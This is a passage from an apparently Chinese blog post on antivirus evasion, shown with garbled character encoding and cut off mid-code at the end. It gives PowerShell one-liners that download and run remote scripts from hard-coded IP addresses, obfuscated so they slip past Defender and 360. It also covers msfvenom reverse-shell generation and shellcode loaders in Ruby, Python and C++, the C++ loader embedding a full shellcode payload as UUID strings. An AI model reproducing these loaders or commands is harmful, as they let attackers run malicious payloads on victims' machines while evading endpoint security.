class="built_in">Invoke-Obfuscation</span></span><br><span class="line">å¤„ç†æ–‡ä»¶ï¼š<span class="built_in">set</span> scriptpath C:\Users\<span class="number">86135</span>\Desktop\<span class="number">1</span>.ps1</span><br><span class="line">å¤„ç†ä»£ç ï¼š<span class="built_in">set</span> scriptblock <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line">è¿›å…¥ç¼–ç ï¼šencoding</span><br><span class="line">é€‰æ‹©ç¼–ç ï¼š<span class="number">1</span><span class="literal">-8</span></span><br><span class="line">è¾“å‡ºæ–‡ä»¶ï¼šout C:\Users\<span class="number">86135</span>\Desktop\<span class="number">11</span>.ps1</span><br></pre></td></tr></table></figure><h5 id="åˆ†ç¦»å…æ€"><a href="#åˆ†ç¦»å…æ€" class="headerlink" title="åˆ†ç¦»å…æ€"></a>åˆ†ç¦»å…æ€</h5><p>é€šè¿‡å°†shellcodeæ”¾åœ¨webç«¯ï¼Œåˆ©ç”¨åŠ è½½å™¨å»ä¸‹è½½æ‰§è¡Œ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$d</span>= ((<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;http://47.94.236.117/1.txt&#x27;</span>))</span><br><span class="line">è§£ç ï¼š</span><br><span class="line"><span class="variable">$x</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$d</span>))</span><br><span class="line"></span><br><span class="line">http://<span class="number">47.94</span>.<span class="number">236.117</span>/<span class="number">1</span>.txt  =  <span class="variable">$d</span> base64æ•°æ®</span><br><span class="line"><span class="variable">$d</span>= ((<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;http://47.94.236.117/1.txt&#x27;</span>))</span><br><span class="line"><span class="variable">$x</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$d</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="PowerShell-æ–‡ä»¶æ¨¡å¼-ç‰¹å¾ä¿®æ”¹è¿‡DeFenderï¼ˆè¿‡ä¸äº†ç«ç»’ï¼‰"><a href="#PowerShell-æ–‡ä»¶æ¨¡å¼-ç‰¹å¾ä¿®æ”¹è¿‡DeFenderï¼ˆè¿‡ä¸äº†ç«ç»’ï¼‰" class="headerlink" title="PowerShell-æ–‡ä»¶æ¨¡å¼-ç‰¹å¾ä¿®æ”¹è¿‡DeFenderï¼ˆè¿‡ä¸äº†ç«ç»’ï¼‰"></a>PowerShell-æ–‡ä»¶æ¨¡å¼-ç‰¹å¾ä¿®æ”¹è¿‡DeFenderï¼ˆè¿‡ä¸äº†ç«ç»’ï¼‰</h4><p><a href="https://www.cnblogs.com/zzjdbk/p/14380138.html">https://www.cnblogs.com/zzjdbk/p/14380138.html</a></p><p>Fuzz DFæŸ¥æ€ç‰¹å¾</p><p>1ã€Shellcodeæ¢æ ¼å¼</p><p>2ã€å˜é‡å&amp;å‡½æ•°åå…¨ä¿®æ”¹</p><p>å°†shellcodeè½¬æ¢æˆå­—èŠ‚å½¢å¼ï¼Œå°†å˜é‡åå‡½æ•°åæ¢æˆè‡ªå®šä¹‰çš„</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="variable">$s</span> = [<span class="built_in">Byte</span>[]]<span class="variable">$var_code</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;ã€csç”Ÿæˆçš„shellcodeã€‘&#x27;</span>)</span><br><span class="line"><span class="variable">$s</span> |<span class="keyword">foreach</span> &#123; <span class="variable">$string</span> = <span class="variable">$string</span> + <span class="variable">$_</span>.ToString()+<span class="string">&#x27;,&#x27;</span>&#125;</span><br><span class="line"><span class="variable">$string</span> &gt; D:\<span class="number">2</span>.txt  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›´æ¥å‘½ä»¤æ‰§è¡Œä¸Šçº¿å¦‚æœè¢«æç¤ºï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•</p><p>3ã€åƒåœ¾æ•°æ®å¹²æ‰°ï¼š</p><p>powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).DownloadString(â€˜htâ€™+â€™tp:&#x2F;&#x2F;43.138.27.12:8880&#x2F;2.ps1â€™)</p><p>4.é€šè¿‡copy powershell.exeç¨‹åº åˆ°å½“å‰æ–‡ä»¶ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ›¿æ¢æ–‡ä»¶åï¼š</span><br><span class="line">powershell <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;<span class="variable">$b</span>=&#x27;tp://47.94.236.117/x.ps1&#x27;&#x27;));&#x27;;IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)&quot;</span></span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe bypass.txt</span><br><span class="line">bypass.txt <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;<span class="variable">$b</span>=&#x27;tp://47.94.236.117/x.ps1&#x27;&#x27;));&#x27;;IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.ä¹Ÿå¯ä»¥å°†è„šæœ¬å‘½ä»¤è½¬æ¢ä¸ºexeç¨‹åºè¿›è¡Œç»•è¿‡</p><p>6.å¯¹äºIEXè¿™ç§æ–¹ä¾¿å¿«æ·çš„æ–¹å¼ç›´æ¥è¿è¡Œä¼šè¢«360æ‹¦æˆªã€‚å¯å°è¯•ä»è¯­æ³•ä¸Šç®€å•å˜åŒ–ã€‚ä¸»è¦æ˜¯å¯¹DownloadStringã€httpåšä¸€äº›å¤„ç†ã€‚<br>æ¯”å¦‚åˆ©ç”¨replaceæ›¿æ¢å‡½æ•°ï¼Œå¯ä»¥bypassã€‚</p><p><a href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-NoExit</span> <span class="string">&quot;<span class="variable">$c1</span>=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;<span class="variable">$c2</span>=&#x27;123(&#x27;&#x27;http://10.211.55.2/shell.ps1&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX (<span class="variable">$c1</span>+<span class="variable">$c2</span>)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ±‡ç¼–ä»£ç å…æ€ç»•è¿‡"><a href="#æ±‡ç¼–ä»£ç å…æ€ç»•è¿‡" class="headerlink" title="æ±‡ç¼–ä»£ç å…æ€ç»•è¿‡"></a>æ±‡ç¼–ä»£ç å…æ€ç»•è¿‡</h3><p>å‚è€ƒï¼š</p><p><a href="https://forum.butian.net/share/1536">https://forum.butian.net/share/1536</a></p><h3 id="javaå…æ€ï¼ˆé™æ€ï¼‰"><a href="#javaå…æ€ï¼ˆé™æ€ï¼‰" class="headerlink" title="javaå…æ€ï¼ˆé™æ€ï¼‰"></a>javaå…æ€ï¼ˆé™æ€ï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1ã€JARåŒ…æºç ç‰¹å¾ä¿®æ”¹å…æ€</span><br><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f jar -o msf.jar</span><br><span class="line">-Jaråç¼–è¯‘å¯¼å‡º-jdgui</span><br><span class="line">-ä¿®æ”¹ä¸Šçº¿é…ç½®-config</span><br><span class="line">-ä¿®æ”¹å¯åŠ¨ä¸»ç±»-MANIFEST.MF</span><br><span class="line">-ä¿®æ”¹æ‰§è¡Œä»£ç -Main.java</span><br><span class="line">-æ‰“åŒ…class-javac Main.java</span><br><span class="line">-ç¼–è¯‘jar-jar cvfm xiaodi.jar META-INF/MANIFEST.MF .</span><br><span class="line"></span><br><span class="line">2ã€JARåŒ…æ‰“åŒ…EXEæ‰§è¡Œå…æ€</span><br><span class="line">å®‰è£…ï¼šexe4j Innoè¿›è¡Œæ‰“åŒ…</span><br><span class="line">exe4j-ä¸‹è½½é“¾æ¥ï¼šhttps://exe4j.apponic.com/</span><br><span class="line">inno-ä¸‹è½½é“¾æ¥ï¼šhttps://jrsoftware.org/isdl.php</span><br><span class="line">æ“ä½œè¯´æ˜ï¼šhttps://www.jb51.net/article/236000.htm</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Rubyå…æ€ï¼š"><a href="#Rubyå…æ€ï¼š" class="headerlink" title="Rubyå…æ€ï¼š"></a>Rubyå…æ€ï¼š</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle/import&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle/types&#x27;</span> </span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">include</span> <span class="title class_">Fiddle</span> </span><br><span class="line">kernel32 = <span class="title class_">Fiddle</span>.dlopen(<span class="string">&#x27;kernel32&#x27;</span>) </span><br><span class="line">ptr = <span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;VirtualAlloc&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(<span class="number">0</span>, shellcode.size, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;VirtualProtect&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(ptr, shellcode.size, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">buf = <span class="title class_">Fiddle</span><span class="symbol">:</span><span class="symbol">:Pointer</span>[shellcode] </span><br><span class="line"><span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;RtlMoveMemory&#x27;</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>],<span class="number">4</span>).call(ptr, buf, shellcode.size)</span><br><span class="line">thread = <span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;CreateThread&#x27;</span>],[<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) </span><br><span class="line"><span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;WaitForSingleObject&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(thread, â€<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="æ— æ–‡ä»¶è½åœ°ï¼ˆåŠ è½½å™¨åˆ†ç¦»ï¼‰"><a href="#æ— æ–‡ä»¶è½åœ°ï¼ˆåŠ è½½å™¨åˆ†ç¦»ï¼‰" class="headerlink" title="æ— æ–‡ä»¶è½åœ°ï¼ˆåŠ è½½å™¨åˆ†ç¦»ï¼‰"></a>æ— æ–‡ä»¶è½åœ°ï¼ˆåŠ è½½å™¨åˆ†ç¦»ï¼‰</h3><p><a href="https://www.freebuf.com/articles/compliance/290379.html">https://www.freebuf.com/articles/compliance/290379.html</a></p><h4 id="Python-File-å°†shellcodeä»æ–‡æœ¬ä¸­æå–"><a href="#Python-File-å°†shellcodeä»æ–‡æœ¬ä¸­æå–" class="headerlink" title="Python-File-å°†shellcodeä»æ–‡æœ¬ä¸­æå–"></a>Python-File-å°†shellcodeä»æ–‡æœ¬ä¸­æå–</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;s.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s=f.read()</span><br></pre></td></tr></table></figure><h4 id="Python-Argv-å°†shellcodeä¸åŠ è½½å™¨åˆ†ç¦»"><a href="#Python-Argv-å°†shellcodeä¸åŠ è½½å™¨åˆ†ç¦»" class="headerlink" title="Python-Argv-å°†shellcodeä¸åŠ è½½å™¨åˆ†ç¦»"></a>Python-Argv-å°†shellcodeä¸åŠ è½½å™¨åˆ†ç¦»</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ ¸å¿ƒä»£ç ï¼š</span><br><span class="line">z=sys.argv[<span class="number">1</span>]</span><br><span class="line">zx=base64.b64decode(z)</span><br><span class="line"><span class="built_in">exec</span>(zx)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Python-Http-å°†shellcodeç”¨è¿œç¨‹åè®®åŠ è½½"><a href="#Python-Http-å°†shellcodeç”¨è¿œç¨‹åè®®åŠ è½½" class="headerlink" title="Python-Http-å°†shellcodeç”¨è¿œç¨‹åè®®åŠ è½½"></a>Python-Http-å°†shellcodeç”¨è¿œç¨‹åè®®åŠ è½½</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">all</span>=requests.get(<span class="string">&#x27;http://www.xxxx.com/all.txt&#x27;</span>).text</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Python-Socket-å°†shellcodeé€šè¿‡ç®¡é“ä¼ è¾“"><a href="#Python-Socket-å°†shellcodeé€šè¿‡ç®¡é“ä¼ è¾“" class="headerlink" title="Python-Socket-å°†shellcodeé€šè¿‡ç®¡é“ä¼ è¾“"></a>Python-Socket-å°†shellcodeé€šè¿‡ç®¡é“ä¼ è¾“</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">å‚è€ƒï¼šhttps://www.cnblogs.com/Keep-Ambition/p/<span class="number">7459213.</span>html</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>(<span class="params">data</span>):</span><br><span class="line">    æ‰§è¡Œcode</span><br><span class="line">server = socket.socket()</span><br><span class="line">server.bind((<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">9999</span>))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn,addr = server.accept()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        zx(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Python-Images-å°†shellcodeéšå†™è¿›å›¾ç‰‡å†…"><a href="#Python-Images-å°†shellcodeéšå†™è¿›å›¾ç‰‡å†…" class="headerlink" title="Python-Images-å°†shellcodeéšå†™è¿›å›¾ç‰‡å†…"></a>Python-Images-å°†shellcodeéšå†™è¿›å›¾ç‰‡å†…</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å‚è€ƒï¼šhttps://mp.weixin.qq.com/s/c8U2M_iJ8pWaI50sH8u9Hw</span><br><span class="line">åŠ å¯†:RGBAencodeDataInImage(im, arguments[<span class="string">&#x27;&lt;text&gt;&#x27;</span>]).save(arguments[<span class="string">&#x27;&lt;encodedImage&gt;&#x27;</span>])</span><br><span class="line">è§£å¯†ï¼šim = Image.<span class="built_in">open</span>(arguments[<span class="string">&#x27;&lt;encodedImage&gt;&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw">https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw</a></p><h3 id="UUIDè½¬æ¢shellcodeå†™å…¥å†…å­˜å…æ€"><a href="#UUIDè½¬æ¢shellcodeå†™å…¥å†…å­˜å…æ€" class="headerlink" title="UUIDè½¬æ¢shellcodeå†™å…¥å†…å­˜å…æ€"></a>UUIDè½¬æ¢shellcodeå†™å…¥å†…å­˜å…æ€</h3><p><a href="https://xz.aliyun.com/t/12253">https://xz.aliyun.com/t/12253</a></p><p><a href="https://www.crisprx.top/archives/458">https://www.crisprx.top/archives/458</a></p><p><a href="https://cloud.tencent.com/developer/article/1787219">https://cloud.tencent.com/developer/article/1787219</a></p><h4 id="c-uuidåŠ è½½å™¨"><a href="#c-uuidåŠ è½½å™¨" class="headerlink" title="c++ uuidåŠ è½½å™¨"></a>c++ uuidåŠ è½½å™¨</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* uuids[] = &#123; <span class="string">&quot;0089e8fc-0000-8960-e531-d2648b52308b&quot;</span>,<span class="string">&quot;528b0c52-8b14-2872-0fb7-4a2631ff31c0&quot;</span>,<span class="string">&quot;7c613cac-2c02-c120-cf0d-01c7e2f05257&quot;</span>,<span class="string">&quot;8b10528b-3c42-d001-8b40-7885c0744a01&quot;</span>,<span class="string">&quot;488b50d0-8b18-2058-01d3-e33c498b348b&quot;</span>,<span class="string">&quot;ff31d601-c031-c1ac-cf0d-01c738e075f4&quot;</span>,<span class="string">&quot;3bf87d03-247d-e275-588b-582401d3668b&quot;</span>,<span class="string">&quot;588b4b0c-011c-8bd3-048b-01d089442424&quot;</span>,<span class="string">&quot;59615b5b-515a-e0ff-585f-5a8b12eb865d&quot;</span>,<span class="string">&quot;74656e68-6800-6977-6e69-54684c772607&quot;</span>,<span class="string">&quot;ff31d5ff-5757-5757-5768-3a5679a7ffd5&quot;</span>,<span class="string">&quot;000084e9-5b00-c931-5151-6a0351516850&quot;</span>,<span class="string">&quot;53000000-6850-8957-9fc6-ffd5eb705b31&quot;</span>,<span class="string">&quot;006852d2-4002-5284-5252-53525068eb55&quot;</span>,<span class="string">&quot;d5ff3b2e-c689-c383-5031-ff57576aff53&quot;</span>,<span class="string">&quot;062d6856-7b18-d5ff-85c0-0f84c3010000&quot;</span>,<span class="string">&quot;f685ff31-0474-f989-eb09-68aac5e25dff&quot;</span>,<span class="string">&quot;68c189d5-2145-315e-ffd5-31ff576a0751&quot;</span>,<span class="string">&quot;b7685056-e057-ff0b-d5bf-002f000039c7&quot;</span>,<span class="string">&quot;ff31b774-91e9-0001-00e9-c9010000e88b&quot;</span>,<span class="string">&quot;2fffffff-6b31-566a-00fe-dc7a2d31c9e7&quot;</span>,<span class="string">&quot;42b51e28-625f-f5a3-6442-792da2d8f774&quot;</span>,<span class="string">&quot;c764c1ca-fec2-b232-360a-a0904efad447&quot;</span>,<span class="string">&quot;d98ba404-65e6-8fa1-bee4-b69563f0b446&quot;</span>,<span class="string">&quot;60f88520-b15e-a0f8-59ef-9eb2c6e6f95d&quot;</span>,<span class="string">&quot;5500078e-6573-2d72-4167-656e743a204d&quot;</span>,<span class="string">&quot;6c697a6f-616c-352f-2e30-2028636f6d70&quot;</span>,<span class="string">&quot;62697461-656c-203b-4d53-49452031302e&quot;</span>,<span class="string">&quot;57203b30-6e69-6f64-7773-204e5420362e&quot;</span>,<span class="string">&quot;57203b32-574f-3436-3b20-54726964656e&quot;</span>,<span class="string">&quot;2e362f74-3b30-5420-6f75-63683b204d41&quot;</span>,<span class="string">&quot;534a5053-0d29-000a-91a8-10b7da807fab&quot;</span>,<span class="string">&quot;2f1623c7-614b-ebbd-a514-6f904bdf5a58&quot;</span>,<span class="string">&quot;1f5557e0-6adb-7456-c2a1-9c9f32da910d&quot;</span>,<span class="string">&quot;952d1001-8eef-7249-3a2b-9e598e85a6ad&quot;</span>,<span class="string">&quot;98c69cb6-7d10-1f09-60a3-4aeabe4af549&quot;</span>,<span class="string">&quot;d618c78a-2260-1751-b8d6-61d38a81373e&quot;</span>,<span class="string">&quot;3d1c3d6a-f3c5-57a0-0204-4457c1142371&quot;</span>,<span class="string">&quot;6c8708c2-6b94-c189-d92b-cc6b62253fbb&quot;</span>,<span class="string">&quot;f102569f-4d54-914d-4e89-5bda5ff092a5&quot;</span>,<span class="string">&quot;cfafb2ac-e2bb-b0af-ca5b-08834c927ab5&quot;</span>,<span class="string">&quot;07d2b997-8fc9-80b7-fc26-3da3d19e2942&quot;</span>,<span class="string">&quot;780bcd05-11c2-4f86-6657-dae24b98cc46&quot;</span>,<span class="string">&quot;febde54d-2cc7-d3c4-e5c0-f943cad41d5a&quot;</span>,<span class="string">&quot;6800da73-b5f0-56a2-ffd5-6a4068001000&quot;</span>,<span class="string">&quot;00006800-0040-6857-58a4-53e5ffd593b9&quot;</span>,<span class="string">&quot;00000000-d901-5351-89e7-576800200000&quot;</span>,<span class="string">&quot;12685653-8996-ffe2-d585-c074c68b0701&quot;</span>,<span class="string">&quot;75c085c3-58e5-e8c3-a9fd-ffff31302e31&quot;</span>,<span class="string">&quot;32342e39-312e-3434-0012-345678000000&quot;</span> &#125;; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HANDLE hc = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//è·å¾—å¯æ‰§è¡Œçš„å¥æŸ„</span></span><br><span class="line">  <span class="type">void</span>* ha = <span class="built_in">HeapAlloc</span>(hc, <span class="number">0</span>, <span class="number">0x100000</span>);<span class="comment">//ç”³è¯·å †ç©ºé—´</span></span><br><span class="line">  <span class="keyword">if</span> (ha == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;å†…å­˜ç”³è¯·å¤±è´¥ï¼&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  DWORD_PTR hptr = (DWORD_PTR)ha;</span><br><span class="line">  <span class="type">int</span> elems = <span class="built_in">sizeof</span>(uuids) / <span class="built_in">sizeof</span>(uuids[<span class="number">0</span>]);<span class="comment">//è·å¾—éœ€è¦å†™å…¥uuidsæ•°ç»„å…ƒç´ ä¸ªæ•°</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; elems; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//cout &lt;&lt; (RPC_CSTR)uuids[i] &lt;&lt; endl;</span></span><br><span class="line">    <span class="comment">//cout &lt;&lt; (UUID*)hptr &lt;&lt; endl;</span></span><br><span class="line">    RPC_STATUS status = <span class="built_in">UuidFromStringA</span>((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="comment">//å†™å…¥shellcode</span></span><br><span class="line">      <span class="keyword">if</span> (status != RPC_S_OK)<span class="comment">//åˆ¤æ–­æ˜¯å¦å†™å…¥æ­£å¸¸</span></span><br><span class="line">      &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;UuidFromeStringA()!=S_OK&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(ha);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    hptr += <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//((void(*)())ha)();</span></span><br><span class="line">  <span class="built_in">EnumSystemLocalesA</span>((LOCALE_ENUMPROCA)ha, <span class="number">0</span>);<span class="comment">//å›è°ƒå‡½æ•°,è¿è¡Œshellcode</span></span><br><span class="line">  <span class="built_in">CloseHandle</span>(ha);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨python2è„šæœ¬å°†shellcodeè½¬æ¢æˆuuid"><a href="#åˆ©ç”¨python2è„šæœ¬å°†shellcodeè½¬æ¢æˆuuid" class="headerlink" title="åˆ©ç”¨python2è„šæœ¬å°†shellcodeè½¬æ¢æˆuuid"></a>åˆ©ç”¨python2è„šæœ¬å°†shellcodeè½¬æ¢æˆuuid</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">buf=<span 